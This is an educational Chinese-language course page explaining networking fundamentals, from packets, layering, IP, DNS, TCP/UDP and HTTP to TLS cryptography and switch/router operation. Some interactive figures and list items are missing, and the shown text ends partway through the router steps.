主題 01

網路有大小兩種，資料切成封包旅行

區域網路 / 網際網路 ‧ 封包 ‧ 路由 ‧ TCP/IP
🧭 整門課的起點：先看「資料是怎麼旅行的」。下一章就用「分層」把這趟旅程的每個步驟分工理清。

剛剛影片講的，其實就是這一章。先講網路的「大小」。小的叫「區域網路」(LAN)：把一個地方的機器連起來，例如你家的手機、電視、筆電，靠同一台路由器互通；學校電腦教室也是一個。它是個「自己人圈圈」，圈內互相找得到，出了圈外面看不到。大的叫「網際網路」：把全世界一個一個小網路串成一張超大的網。所以一份網頁只放在一台電腦裡，別人連不到；要全世界連到，得先走進網際網路。

那資料怎麼送過去？影片有演：不是整包送，而是先切成一個個「封包」。每個封包都很小，上面寫三件事——要送到哪（目的地）、從哪來（來源）、自己是第幾號（編號），方便對方照號碼組回去。為什麼要切？因為切小塊才好塞縫隙、走不同的路，而且掉了一塊只要補那一塊，不用整個重傳。

封包送出去後，會經過一台又一台路由器，一站一站接力轉送，每台看目的地決定丟給下一台，像郵件經過轉運站。神奇的是：同一筆資料的不同封包，可能走不同的路，哪條順走哪條，最後在終點會合。

封包離開你家路由器後，先到電信公司，也就是 ISP，再上更大條的骨幹網路跨城市、跨國；而國與國之間，大多靠鋪在海底的光纖電纜傳送。所以你傳給國外朋友的封包，常常真的「潛到海底」再上岸。

最後，靠 TCP/IP 這組規矩確保不漏不亂：IP 負責把封包送到對的地方，TCP 負責切割、編號、檢查有沒有到齊，少了哪一塊就叫對方重傳。封包到了對方伺服器，伺服器把回應也切成封包送回，你的電腦再照編號重新組合，瀏覽器畫成你看到的畫面——整趟來回通常零點幾秒。

小網路只在自己這通、要連外面走大網路；資料切成封包、編號、一站一站接力（跨海走海底電纜），靠 TCP/IP 確保不漏不亂，到對方再組回畫面。

封包長什麼樣子？標頭 + 酬載

每個封包都是兩段：標頭（Header）是「面單」，寫著要送到哪、從哪來、第幾號、有沒有錯；酬載（Payload）才是真正要搬的那一小塊資料。收件方靠標頭裡的序號，把亂序到達的封包排回正確順序，再拼成完整檔案。

工程深入頻寬 ≠ 延遲 ≠ 吞吐量；封包交換為何贏了電路交換
三個常被混為一談的詞
  • 頻寬 Bandwidth：管子有多「粗」，單位 bps（bit/秒）。家用 500 Mbps 指的是頻寬，不是速度。注意：網路業者寫 Mbps（小 b＝bit），檔案大小是 MB（大 B＝byte），1 byte = 8 bit，所以 500 Mbps ÷ 8 ≈ 62.5 MB/s。
  • 延遲 Latency：一個封包跑「一趟」要多久，單位 ms。主要由距離（光在光纖中約 200,000 km/s）+ 沿途每台路由器的處理/排隊時間決定。RTT 是來回一趟，ping 量的就是它。
  • 吞吐量 Throughput：實際每秒真正搬到多少資料。它會被「頻寬」「延遲」「封包遺失」「對方處理速度」一起拖住，通常 < 頻寬。

經典比喻：一台塞滿硬碟的卡車，頻寬大得驚人，但延遲是好幾個小時。要傳一部 4K 電影選卡車（高頻寬），要即時對話選網路（低延遲）——這就是為什麼遊戲在意 ping、下載在意頻寬。

頻寬延遲積 BDP — 為什麼「網速夠快卻下載不滿」

連線在「資料已送出、但確認還沒回來」這段時間裡，管線中可以塞的資料量 = 頻寬 × RTT，稱為 BDP（Bandwidth-Delay Product）。跨國高頻寬連線若 TCP 視窗（一次能在路上的未確認資料量）小於 BDP，速度就上不去——這也是為什麼 CDN 把伺服器搬到離你近的地方（降低 RTT）能大幅加速。

封包交換 vs 電路交換
  • 電路交換 Circuit Switching（舊電話網）：通話前先「接一條專線」全程獨佔，沒講話也佔著，浪費且不耐斷。
  • 封包交換 Packet Switching（網際網路）：資料切成封包，每個獨立找路、共享線路；某段斷了自動繞道，利用率與韌性都遠勝。代價是封包可能亂序、遺失、延遲不固定（jitter），所以才需要 TCP 在上面收尾。
為什麼一定要切？MTU 與分片

實體鏈路一次能塞的最大封包大小叫 MTU（乙太網路通常 1500 bytes）。資料超過就得切。若中途某段 MTU 更小、又不准分片，封包會被丟棄並回報——這就是惡名昭彰的 MTU/分片問題，VPN、PPPoE 連線常因此「網頁開一半卡住」。RFC 791（IP）RFC 1191（Path MTU）

主題 02

分層模型：把「上網」拆成七層分工

OSI 七層 ‧ TCP/IP 四層 ‧ 封裝 Encapsulation
🧭 承上：上一章那趟旅程牽涉加密、編號、定址…本章用「分層」把它們各歸其位。下一章進入最關鍵的一層——IP 定址。

上一章我們看到資料切成封包、一站一站送。但「打網址 → 看到網頁」這件事其實牽涉很多步驟：要加密、要編號、要找門牌、要轉成電波……如果全部混在一起寫，沒人維護得了。工程師的解法是分層（Layering）：把整件事切成一疊「樓層」，每一層只負責一件事，而且只跟上下相鄰的層對話。

分層最大的好處是可以抽換：今天你從 Wi-Fi 換成 5G、從網路線換成光纖，最底層變了，但上面的 HTTP、你的瀏覽器一行都不用改——因為它們只跟相鄰層講話，不管底下是電波還是光。這就是為什麼同一個網頁能同時在手機、筆電、光纖、衛星上跑。

業界有兩套分層地圖。OSI 七層是「教科書理想模型」，把事情分得很細，方便溝通與排錯（工程師說「這是第幾層的問題」就是指它）；TCP/IP 四層是「真實世界實際在跑」的精簡版。兩者對得起來，下面這張圖一次看懂。

資料怎麼穿過這疊樓層？送出時由上往下，每一層都在前面貼一張自己的標頭（Header），像幫包裹一層層加上不同的單據，這叫 封裝（Encapsulation）；到了對方，再由下往上一層層拆開（解封裝），最後把乾淨的資料交給應用程式。每一層的「那一包」還有專有名字：傳輸層叫區段、網路層叫封包、連結層叫訊框。

分層＝把上網拆成一疊樓層，每層只做一件事、只跟鄰層對話，所以底層技術可以隨意抽換。送出時由上往下逐層加標頭（封裝），接收時由下往上逐層拆（解封裝）。
📦
像寄一個國際包裹：你只管寫信（應用層），物流幫你裝箱→貼面單→裝貨櫃→上船（每層加一層包裝）；對方下船→拆櫃→拆箱→讀信。你完全不用懂船怎麼開——那是底層的事。

工程深入實務裡的「第幾層」：L2/L3 交換、L4/L7 負載平衡、與那個 layer-8 笑話

分層不只是考試名詞，它是整個產業的共同語言。聽得懂層號，你就聽得懂工程師在吵什麼：

裝置工作在哪一層，決定它「看得到什麼」
  • 交換器 Switch（L2）：只看 MAC 位址，在同一個區域網路內把訊框送到正確的網卡。便宜、快、不懂 IP。
  • 路由器 Router（L3）：看 IP 位址，決定封包要跨網段往哪個「下一跳」送。家用路由器其實是 路由器+交換器+Wi-Fi AP+NAT 的合體。
  • L4 負載平衡：只看 IP+Port，把連線整條轉給某台後端，速度快但不懂內容。L7 負載平衡（如 Nginx）看得懂 HTTP，能依「網址路徑」「Cookie」分流——功能強但較吃資源。
為什麼排錯要「由下往上」一層層查

網路不通時，老手的順序是：L1 線插好了嗎 → L2 同網段通嗎（ARP/MAC）→ L3 ping 得到 IP 嗎 → L4 Port 開著嗎（telnet/nc）→ L7 應用回應正常嗎（curl）。每一層確認後再往上，問題範圍就被夾住了。第 9 章會把這套工具走一遍。

那句行話：「問題出在第 8 層」

OSI 只有 7 層，所以工程師戲稱 Layer 8 = 使用者（人為設定錯誤）、Layer 9 = 老闆/預算/政治。看到工單寫「L8 issue」，意思通常是「不是機器的錯」😏。另一句名言：「It's always DNS.」——查不出原因時，先回頭懷疑 DNS（第 3 章），命中率高得嚇人。

🧭 承上：分層模型的第 3 層（網路層）。本章把「怎麼定位到一台機器」從頭講透。下一章：找到機器後，第 4 層怎麼找到機器上正確的「服務」。

      

        
每台上網的機器都有一個 IP 位址，像門牌（192.168.1.100）。最常見的 IPv4 是 32 位元，寫成四段 0–255 的數字，全世界總共約 43 億個——聽起來很多，其實早就不夠分了（待會講 IPv6 怎麼救）。

        
私有 IP（10. / 172.16~31. / 192.168. 開頭）只在自己的小網路裡有效、可以重複；公有 IP 才是全世界唯一、外面查得到的正式地址。所以把自己電腦的 192.168 位址貼給網友是連不到的——那只是「你家社區內部的門牌」。

        
更關鍵的是：一個 IP 其實分成兩半——前面是「哪個社區（網路部分）」，後面是「社區裡第幾戶（主機部分）」。決定「從哪裡切兩半」的，就是子網路遮罩（Subnet Mask）。同一個社區裡的機器可以直接互通，要跨社區就得透過路由器。

        
最後，IP 是一串數字很難記，所以有好記的網域名稱（像 google.com）。電腦只懂數字，中間靠翻譯員 DNS：你一打名字，DNS 就查出對應 IP，快到你沒感覺。這一章就把「怎麼定位一台機器」從頭到尾講透。

      

      
IP＝門牌（私有對內、公有全世界唯一）；一個 IP 分成「網路部分＋主機部分」，由子網路遮罩決定切點；名字靠 DNS 翻成 IP。

      
📇

    • 
            
  • /30 = 255.255.255.252 → 2 台（兩台路由器點對點連線最省）
    • 
            
  • /32 = 單一台主機；/0 = 全部位址（預設路由 0.0.0.0/0）

IP 之下還有一層：MAC 位址與 ARP

        工程深入ARP 封包長相、無償 ARP、Proxy ARP
        

          
ARP 封包裡有什麼

          
核心是一個 operation code：1 = 請求（who has?）、2 = 回覆（is at），外加發送方與目標方各自的 MAC + IP。請求用廣播（目標 MAC 全 0/全 F）、回覆用單播。整個過程只在同一個區網（L2）內，不跨路由器。

          
無償 ARP（Gratuitous ARP）

          
    
            
  • 裝置開機或換 IP 時主動廣播「我是 192.168.1.x，MAC 是…」，讓大家更新快取。
    • 
            
  • 也用來偵測 IP 衝突：宣告前先問「有人已經用這個 IP 嗎？」有人回就代表撞號。
    • 
            
  • HA（高可用）切換 VIP 時也靠它通知交換器「這個 IP 現在在我這台」。
    • 
          

          
Proxy ARP

          
路由器代替別網段的主機回答 ARP，讓兩邊像在同一網段一樣溝通（舊技術，現在多用正確的子網與路由取代）。

  • 查 ARP 表拿到「下一跳」的 MAC（沒有就先發 ARP）。
    • 
            
  • 封裝成訊框送出。注意：每經過一台路由器，IP 不變，但來源/目的 MAC 會被換成這一段的兩端——這是 L2 與 L3 分工的精髓。
    • 
          

          
ICMP：網路的「回報」協定

          
ping 用的是 ICMP（Echo Request/Reply），traceroute 也靠它回報「TTL 到期」。但很多伺服器故意擋掉 ICMP，所以 ping 不通 ≠ 機器關機，可能只是防火牆不回應——排錯時要改用實際的 Port 測試（第 9 章）。

          
IPv6 沒有 ARP，改用 NDP（鄰居探索） 搭配 ICMPv6 完成同樣的事，並支援 SLAAC 自動配置位址。RFC 826（ARP）RFC 4861（NDP）

        

      


      
DNS：把名字翻成 IP 的階層式查詢

      
你打 www.google.com，電腦其實要問好幾層才查得到 IP。DNS 是一棵由右往左解析的樹：先問根（Root）「.com 歸誰管」，再問 .com 的 TLD 伺服器「google.com 歸誰管」，最後問 google 的權威伺服器拿到真正的 IP。中間有一位遞迴解析器（通常是你 ISP 或 8.8.8.8）幫你跑完全程並快取結果，所以第二次幾乎是瞬間。

主題 04
傳輸層：用 Port 找服務，用 TCP/UDP 決定可靠或快
Port 埠號 ‧ 三向交握 ‧ TCP vs UDP

      
🧭 承上：IP 已把封包送到正確的機器。本章第 4 層用 Port 找到「哪個程式」，並在可靠(TCP)與快(UDP)之間取捨。下一章：建立在它之上、你天天用的 HTTP。

      

        
網路層（IP）只負責一件事：把封包丟到對的「機器」。但它不保證會到、不保證順序、也不知道該交給機器上的哪個程式。這些缺口，由上一層的傳輸層補齊，它解決兩個問題：

        
第一，一台機器同時跑很多服務（網頁、信箱、遊戲…），封包到了要交給誰？靠 Port（埠號）——IP 找到大樓，Port 找到正確的房間。所以「IP : Port」才是一個服務的完整地址，例如 142.250.66.110:443。

        
第二，要不要保證「完整、正確、按順序」送到？這就是 TCP 與 UDP 的分水嶺。TCP 像掛號信：先打招呼建立連線、每封都編號、收到要回簽收、掉了會重寄、保證照順序——可靠但較慢。UDP 像明信片或現場喊話：抓了就丟、不確認、不重傳——可能掉、可能亂，但快、即時、負擔小。

      

      
傳輸層＝Port 找服務 + 選擇可靠度。TCP 可靠（建線、編號、簽收、重傳、保序）；UDP 求快（不建線、不保證）。網頁/Email 用 TCP；DNS/直播/遊戲/通話用 UDP。

      
📮
TCP＝掛號信：要簽收、會補寄、照順序到。UDP＝現場喊話／明信片：喊出去就算，沒人保證每句都聽到，但夠快、夠即時。


      
連線怎麼開始：TCP 三向交握

      
TCP 傳資料前，雙方要先「對暗號」確認彼此都能收能送，這叫三向交握（Three-way Handshake）：客戶端說 SYN（我想連，我的序號是…），伺服器回 SYN-ACK（好，我收到了，我的序號是…），客戶端再回 ACK（確認）。三句話講完，連線才算建立。

      

        
圖 4-1 · TCP 三向交握（動畫）

        
        
三句話的代價：連線建立要花一個來回（1×RTT）才能開始傳資料。這也是為什麼跨國連線「第一次比較慢」、為什麼 HTTP/2 要重複利用同一條連線、HTTP/3 乾脆改用 UDP 省掉這段（第 5 章）。結束時則有對應的「四向揮手」FIN→ACK→FIN→ACK。

      


      
建立之後：資料怎麼流動（視窗與累積 ACK）

      
握手完成、進入 ESTABLISHED 後就開始傳資料。重點是 TCP 不會一個區段等一個 ACK——只要在「視窗」範圍內，可以連續送好幾個區段在路上（pipelining），收端再用累積 ACK 一次確認到哪。下面動畫就是這個流動。

      

        
圖 4-2 · 連線建立後的資料傳輸（動畫）

        
        
「視窗」越大、又沒掉包，吞吐量就越高——這正是第 1 章頻寬延遲積 BDP 的實際樣貌：在路上的資料量 ≈ 頻寬 × RTT。視窗太小，跨國高頻寬連線就跑不滿。

TCP vs UDP：什麼時候用哪個

      

        
🔒 TCP（要正確）
  • 先三向交握建立連線
  • 編號 + 簽收 + 重傳 + 保序
  • 有流量控制與壅塞控制
  • 用在：網頁、Email、檔案、SSH、資料庫
  • 代價：較慢、負擔較大

        
⚡ UDP（要即時）
  • 不建線、丟了就算、不保證順序
  • 標頭超小、延遲低
  • 掉一兩個封包沒關係（晚到的影格不如丟掉）
  • 用在：DNS、直播、線上遊戲、語音通話
  • HTTP/3（QUIC）也建在 UDP 上

      


      

        工程深入TCP 怎麼做到「可靠」：序號、視窗、壅塞控制、與隊頭阻塞
        

          
靠標頭裡這幾個欄位

          
    
            
  • Sequence / Ack number：每個位元組都有序號，對方回報「我收到 ack=N 之前的都到了」，少了就重傳——這就是「保證完整、保序」的機制。
    • 
            
  • 旗標 Flags：SYN(建線) ACK(確認) FIN(關閉) RST(強制斷) PSH(立刻送)。
    • 
            
  • Window 視窗：接收端告訴對方「我緩衝區還能收多少」，避免被灌爆——這是流量控制。
    • 
          

          
壅塞控制：不把網路塞爆的禮貌

          
TCP 一開始慢啟動（Slow Start），傳輸量指數成長；一旦偵測到掉包（網路塞車的訊號）就砍半再緩升（AIMD：加性增、乘性減）。這套自律讓上億條連線共享線路而不崩潰，是網際網路能運作的隱形功臣。RFC 5681

          
重傳與逾時

          
送出後啟動計時器（RTO），逾時沒收到 ACK 就重傳；也支援「快速重傳」（連收 3 個重複 ACK 就立刻補）。RTO 會依實測 RTT 動態調整。

          
TCP 的痛點：隊頭阻塞（Head-of-Line Blocking）

          
因為要「保序」，只要前面一個封包掉了，後面就算到了也得等它補回來才能交付。在一條 TCP 連線上多工（HTTP/2）時，一個丟包會卡住所有串流——這正是 HTTP/3 改用 UDP-based 的 QUIC、把可靠性自己重做一遍的根本動機（第 5 章）。

        

      


      
連線的一生：TCP 狀態機與四向揮手

      
一條 TCP 連線從建立到關閉會經過一連串狀態，你在 ss / netstat 看到的 ESTAB、TIME-WAIT 就是它。建立靠三向交握，關閉則要四向揮手（雙方各自關自己那一向）。看懂這些狀態，伺服器爆連線、埠用光時你才查得出原因。

TIME_WAIT 不是 bug：主動關閉方故意多等 2×MSL，確保最後的 ACK 真的送達、且這條 4-tuple 上的舊封包都消散，避免下一條同樣 IP:Port 的連線收到上一條的殘留封包。TCP 各欄位的真實位元組，回去看第 2 章的封包解碼器。

        工程深入埠用光、TIME_WAIT 海嘯、MSS 協商——高併發踩過的雷
        

          
臨時埠耗盡（Ephemeral Port Exhaustion）

          
每條主動發起的連線都要借一個來源臨時埠。Linux 預設範圍 32768–60999（約 28,000 個，sysctl net.ipv4.ip_local_port_range 可調）。一台機器狂開短連線到同一個目的 IP:Port 時，加上每條關閉後留 60 秒的 TIME_WAIT，臨時埠很快用光 → 新連線報 EADDRNOTAVAIL / connect failed。

          
    
            
  • 解法：用長連線 / 連線池（HTTP keep-alive、DB pool）少開連線；net.ipv4.tcp_tw_reuse=1 重用 TIME_WAIT；分散到多個目的或多個來源 IP。
    • 
            
  • 連線由 4-tuple（來源 IP+埠、目的 IP+埠）唯一識別——所以瓶頸是「對同一目的」的臨時埠，不是全機。
    • 
          

          
CLOSE_WAIT 一直累積

          
幾乎都是程式 bug：對方關了（送 FIN），你的程式收到卻沒呼叫 close()，連線就卡在 CLOSE_WAIT、佔著檔案描述子（fd），最後 Too many open files。

          
MSS：每段最多塞多少資料

          
三向交握時雙方在 SYN 裡夾帶 MSS 協商每個 TCP 段的最大資料量，典型 1460 = MTU 1500 − IP 20 − TCP 20。VPN/PPPoE 會更小；MSS 設不對就是「網頁開一半卡死」的元兇之一。RFC 9293（TCP）

主題 05
Web 怎麼運作：HTTP 請求、狀態碼、與上鎖的 HTTPS
HTTP 方法/狀態碼/標頭 ‧ 主從架構 ‧ HTTPS

      
🧭 承上：TCP 把連線接通了。本章看 Web 世界用 HTTP 怎麼一問一答。下一章：網址列那把 https 的鎖，到底怎麼運作。

      

        
傳輸層把連線接通後，網頁世界用 HTTP 這個「共同語言」溝通。它是主從式、一問一答：你的瀏覽器（客戶端）送出請求（Request），伺服器回一個回應（Response）。打開一個網頁看起來是一個動作，背後其實是幾十到上百個請求——HTML 一份、CSS 幾份、JS 幾份、圖片一堆，各自一來一回。

        
一個請求講三件事：用什麼動作（方法，如 GET 取得、POST 送出）、要哪個資源（路徑 /path）、附帶什麼資訊（標頭 Headers）。伺服器的回應則帶一個 狀態碼 告訴你結果（200 成功、404 找不到、500 伺服器爆了），加上標頭和真正的內容（網頁、圖片、JSON…）。

        
網址前面的 http / https 就是這套規矩。https 比 http 多一把鎖（TLS 加密），半路被攔也只是亂碼；登入、付款一定要看網址列的鎖頭（鎖怎麼運作，第 6 章拆給你看）。按「用 Google 登入」時，Google 認的也是網址有沒有登記、有沒有上鎖——假網站網址對不上，就拿不到你的帳號。

      

      
HTTP＝主從式一問一答：請求說「方法＋路徑＋標頭」，回應給「狀態碼＋標頭＋內容」。一個網頁＝很多請求。https＝http＋TLS 鎖。

同源政策與 CORS

          
瀏覽器強制同源政策：網頁的 JS 預設只能呼叫同一個來源（協定+網域+埠都相同）的資源。要跨網域呼叫 API，伺服器必須回 Access-Control-Allow-Origin 明確允許。對「非簡單請求」（PUT/DELETE、自訂標頭…），瀏覽器會先送一個 OPTIONS 預檢（preflight）問「我能這樣打嗎」，伺服器答應了才送真正的請求。

          
關鍵：CORS 是瀏覽器在保護使用者，不是伺服器拒絕你。所以同一支 API 用 curl/Postman 打會成功（它們不是瀏覽器、不受同源限制），在網頁裡 fetch 卻被擋——解法是在伺服器加上正確的 CORS 標頭，不是改前端。

          
快取協商：200 → 304 的省錢魔法

          
第一次給 200 + ETag；之後瀏覽器帶 If-None-Match: 那個ETag 來問，沒變就回 304 Not Modified（沒有 body），瀏覽器直接用本地快取。CDN 大量靠這招省頻寬。RFC 9110 / 9111

HTTP 的進化：1.1 → 2 → 3（點分頁看差別）

      

        

          
          
          
        

        

          
1997 年至今的主力，純文字。同一條連線一次只能處理一個請求、回完才換下一個，所以瀏覽器要同時開好幾條連線硬擠並行。每個請求都重複送一大包文字標頭，浪費頻寬，且有隊頭阻塞。

        

        

          
2015 年，改成二進位。一條連線就能多工（multiplexing）同時跑很多請求、不必互等；標頭壓縮（HPACK）省頻寬；可由伺服器主動推送資源。痛點：底層仍是 TCP，只要一個封包掉了，TCP 層的隊頭阻塞還是會卡住整條連線。

        

        

          
2022 年，跳出 TCP。改用建在 UDP 上的 QUIC，把可靠性自己重做：每個串流各自獨立，掉一個封包只卡那一條、不拖累別人；內建 TLS 1.3，連線建立更快（甚至 0-RTT）；還支援連線遷移——手機從 Wi-Fi 切到 4G，連線不中斷。YouTube、主要網站都已在用。

🧭 承上：上一章說 https＝http＋鎖。本章把那把鎖完整拆開：加密、握手、憑證。下一章：以上協定，最後都跑在哪些實體裝置與架構上。

      

        
上一章說 https = http + 一把鎖。這一章我們把鎖拆開看。在不安全的網路上（任何一段都可能被偷看、被竄改、被冒充），HTTPS 要同時做到三件事：保密（別人攔到只是亂碼）、完整（內容沒被中途改過）、身分（對方真的是 google.com，不是假冒的）。背後靠兩種加密 + 一張憑證。

        
對稱加密：鎖和開用同一把鑰匙，速度快——但問題是「怎麼把這把鑰匙安全地交給對方？」在公開網路上直接傳，等於把鑰匙也寄出去被攔。非對稱加密：用一對鑰匙，公鑰負責鎖、私鑰負責開；公鑰可以大方公開，私鑰自己死守。別人用你的公鑰鎖的東西，只有你的私鑰能開——金鑰交換的難題迎刃而解。

        
聰明的 TLS 是這樣搭配的：先用「慢但安全」的非對稱加密，安全地協商出一把臨時的對稱金鑰；之後整段通訊改用「快」的對稱加密。兩全其美。而「對方到底是不是 google.com」這件事，靠的是一張由公正第三方（憑證機構 CA）簽發、瀏覽器內建信任的數位憑證。

      

      
HTTPS = 保密 + 完整 + 身分。用非對稱加密安全換出一把對稱金鑰（因為對稱快），通訊全程對稱加密；用 CA 簽發的憑證證明「對方真的是它」。

      
🔐
非對稱像掛鎖：我把「打開的掛鎖」（公鑰）寄給全世界，誰都能用它鎖箱子，但只有我手上的鑰匙（私鑰）能開。憑證則像公證人蓋章的身分證，證明這把公鑰真的屬於 google。


      
兩種加密：對稱（快）vs 非對稱（能交換金鑰）

關鍵心法：非對稱負責「安全地交換鑰匙」，對稱負責「之後高速通訊」。RSA、ECDHE 是常見的非對稱／金鑰交換算法；AES 是常見的對稱算法。

      


      
加密家族大全：對稱、非對稱、雜湊三大支柱

      
剛剛那個加密套件 TLS_AES_256_GCM_SHA384 其實同時用到三類不同的密碼學工具。整個資安世界就建立在三大支柱上——記住它們各自「快不快、可不可逆、拿來做什麼」，你就抓得住所有加密的脈絡。

一句話分辨：對稱＝可逆、快、一把鑰匙；非對稱＝可逆、慢、一對鑰匙；雜湊＝不可逆、產生指紋。TLS 把三者組合起來，才同時做到保密、完整、身分。

      


      
① 對稱加密：AES、加密模式與 AEAD

      
加解密用同一把金鑰，速度快，是加密大量資料的主力。代表是 AES（美國標準，金鑰 128/192/256 位元；AES_256 就是 256 位元金鑰）與 ChaCha20（在沒有 AES 硬體加速的手機上更快）。AES 是分組密碼（一次處理 128 位元一塊），多個區塊怎麼接，由「加密模式」決定——這一步選錯，再強的 AES 也會破功。

      

        
模式特性建議

        
ECB每塊獨立加密 → 相同明文產生相同密文，洩漏圖案（著名的「加密企鵝」圖還看得出輪廓）❌ 永遠別用

        
CBC區塊互相串接、需要 IV；用錯易有 padding 攻擊舊系統可，漸淘汰

        
CTR把分組變成串流、可平行加密可，但需配 MAC

        
GCMAEAD：加密 + 內建完整性驗證，一步到位✅ 現代首選

      

      
AEAD（如 AES-GCM、ChaCha20-Poly1305）＝「加密 + 防竄改 + 驗證」一個動作全包。TLS 1.3 只准用 AEAD——這就是 ..._GCM_... 出現在加密套件裡的原因。


      
② 非對稱加密：RSA、ECC 與三種用途

③ 金鑰交換與前向保密：DH / ECDHE

      
Diffie-Hellman（DH） 的魔法：雙方在完全公開的頻道上互通幾個數字，各自配上自己的私密值，就能算出相同的共享祕密，而旁邊竊聽全程的人卻算不出來。ECDHE（橢圓曲線版 + Ephemeral 臨時）每次連線都用全新的臨時金鑰，帶來前向保密（Forward Secrecy）：就算伺服器私鑰未來外洩，攻擊者也解不開以前錄下的流量。TLS 1.3 已強制使用它。


      
④ 雜湊與訊息驗證：SHA、HMAC

      
雜湊把任意資料壓成固定長度的「指紋」，單向不可逆、雪崩效應（改一個位元指紋全變）、抗碰撞（很難找到兩份資料同指紋）。常用 SHA-256 / SHA-384（SHA-2 家族）、SHA-3、BLAKE2/3。

      
    
        
  • ⚠ MD5 與 SHA-1 已被攻破（能造出碰撞），別再用於任何安全用途，只能當非安全的校驗。
    • 
        
  • HMAC＝雜湊 + 一把金鑰 → 驗證「訊息沒被改，且來自知道金鑰的人」（API 簽章常用）。
    • 
        
  • 雜湊 ≠ 加密：它不能解回原文。所以正派網站「忘記密碼」只能重設、不能寄回原密碼。
    • 
      


      
⑤ 密碼專用的「慢」雜湊：bcrypt / Argon2

      
一般雜湊太快，攻擊者每秒可試數十億次。存密碼要用故意很慢、且能加鹽的演算法：bcrypt、scrypt、Argon2（現代首選，還能抵抗 GPU/ASIC 加速破解）。成本參數可調，硬體變快就把它調更慢。第 8 章有 bcrypt 雜湊的真實長相。

  • 對稱：AES-128 已足夠安全，AES-256 更保守（也擋一部分量子威脅）。
    • 
            
  • 非對稱：RSA ≥ 2048（新系統建議 3072+）、ECC 用 P-256 以上。
    • 
          

          
後量子密碼（PQC）

          
夠強的量子電腦能破解 RSA 與 ECC（Shor 演算法）。NIST 已標準化抗量子演算法（金鑰封裝 ML-KEM/Kyber、簽章 ML-DSA/Dilithium），各大廠正逐步把它混進 TLS。對稱與雜湊只要加長金鑰即可（Grover 演算法只把強度砍半）。

          
黃金守則：別自己造加密

          
密碼學魔鬼藏在細節（IV 重用、時序攻擊、亂數品質…）。永遠用經過審查的函式庫（libsodium、OpenSSL、平台原生 API），自製演算法或自己拼湊幾乎一定有洞。

        

      


      
TLS 握手：連線前先換好鑰匙、驗好身分

      

        
圖 6-2 · TLS 握手（簡化）

        
        
TLS 1.2 要 2 個來回，TLS 1.3 精簡到 1 個來回（甚至 0-RTT 續連），這也是現代網站變快的原因之一。握手成功後，那把臨時對稱金鑰只用於這一段連線，結束就丟。

      


      
憑證與 CA：憑什麼相信「對方是 google」？

      

        
圖 6-3 · 信任鏈（Chain of Trust）

        
        
所以那個 🔒 鎖頭真正保證的是：① 連線有加密、② 對方擁有這張憑證對應的私鑰、③ 憑證由可信 CA 為這個網域簽發。它不保證這個網站「是好人」——釣魚網站也能申請合法憑證（第 8 章）。

      


      

        工程深入雜湊、數位簽章、與「鎖頭其實沒保證的事」
        

          
雜湊 Hash：資料的指紋

          
雜湊函數（如 SHA-256）把任意資料壓成固定長度的「指紋」，且單向不可逆、改一個字指紋就全變。它用來驗「完整性」——下載檔案比對雜湊值，一樣就代表沒被竄改。注意：雜湊不是加密（不能解回原文），密碼就是用加鹽雜湊存的（第 8 章）。

          
數位簽章 = 雜湊 + 私鑰

          
把內容算出雜湊，再用私鑰加密這個雜湊，就是「簽章」。任何人用對應公鑰解出來、和自己重算的雜湊比對，就能確認「確實是私鑰持有者發的、且沒被改過」。憑證的可信度就是靠 CA 一層層簽章堆出來的。

          
鎖頭保證什麼、不保證什麼

          
    
            
  • ✅ 保證：傳輸加密、對方持有該憑證私鑰、憑證為此網域簽發。
    • 
            
  • ❌ 不保證：網站是善意的。有 https ≠ 安全網站——釣魚站也有鎖頭。真正要看的是網域名稱對不對。
    •

主題 07
網路背後的裝置與架構：交換器、路由器、NAT、防火牆、CDN
L2/L3 ‧ NAT ‧ 防火牆/代理 ‧ CDN/負載平衡 ‧ Wi-Fi/行動網路

      
🧭 承上：協定都講完了。本章看這些封包實際跑在哪些裝置上、大型網站怎麼撐住流量。下一章：怎麼保護這一整套——資訊安全。

      

        
你家那台「路由器」其實是四合一的機器：發 Wi-Fi（無線基地台 AP）、把家裡裝置接成一個區網（交換器，第 2 章的 L2）、決定封包對外往哪送（路由器，L3）、再用 NAT 讓全家共用一個公有 IP 出門，同時當第一道防火牆。難怪它一台抵四台。

        
區網內部，交換器看 MAC 位址（L2）把訊框送到正確的網卡；要跨出去到別的網路，才交給路由器看 IP（L3）決定下一跳。IP 是大樓地址、Port 是房間號，「IP + Port」才能精準找到某台機器上的某個服務。

        
Wi-Fi 用電波連上路由器：2.4GHz 傳得遠、穿牆強但較慢，5GHz 快但怕牆；記得連上 Wi-Fi ≠ 有外網（可能路由器對外斷了）。手機沒 Wi-Fi 時靠基地台：發電波給基地台 → 電信核心網 → 網際網路；移動時訊號在基地台間交棒（換手），所以邊走邊講電話不會斷。

      

      
家用路由器＝Wi-Fi AP＋交換器(L2)＋路由器(L3)＋NAT/防火牆 四合一。交換器看 MAC、路由器看 IP；對外靠 NAT 共用一個公有 IP。

      
🏢
路由器像大樓的總機＋警衛：對內幫每個房間編號（交換器/DHCP）、對外用大樓正式地址收發（NAT），進出都經過它（防火牆）。

企業/機房裡這四個角色會拆成獨立設備（專業交換器、路由器、防火牆各一台），效能與安全更好；家用則整合成一台省錢省空間。理解它「其實是四個東西」，排錯時就知道該查哪一塊。

      


      
交換器（L2）的完整運作：學習 → 轉送 → 泛洪

      
交換器只看 MAC 位址，靠三個動作把訊框送對網卡：

      

        
1
學習（Learning）：每收到一個訊框，就看它的來源 MAC，記下「這個 MAC 在哪個埠進來」，寫進 MAC 表（CAM table）。

        
2
轉送（Forwarding）：查表找目的 MAC。表裡有 → 只從那一個埠送出去（單播），其他埠完全聞不到，安全又省頻寬。

        
3
泛洪（Flooding）：表裡查不到目的 MAC（剛開機還沒學到）、或目的是廣播（ff:ff:ff:ff:ff:ff）時 → 送到「除來源外的所有埠」，讓對的那台自己回應。回應時來源就被學起來，下次就不必泛洪了。

        
4
老化（Aging）：MAC 表的紀錄有壽命（預設約 300 秒），一段時間沒再看到就清掉，避免裝置換位置後資訊過時。

路由器（L3）的完整運作：查表 → 改寫 → 轉送

      
交換器只在同網段內轉送；要跨網段就得靠路由器。每收到一個封包，路由器做四件事：

      

        
1
查路由表：看封包的目的 IP，在路由表裡找「最長前綴匹配（Longest Prefix Match）」——符合的網段中前綴最長（最精確）的那一條勝出，得到「下一跳 + 出口介面」。都不符就走預設路由 0.0.0.0/0。

        
2
TTL − 1：把封包的 TTL 減 1。減到 0 就丟棄，並回一個 ICMP「逾時」訊息給來源——這正是 traceroute 能逐跳測量的原理。

        
3
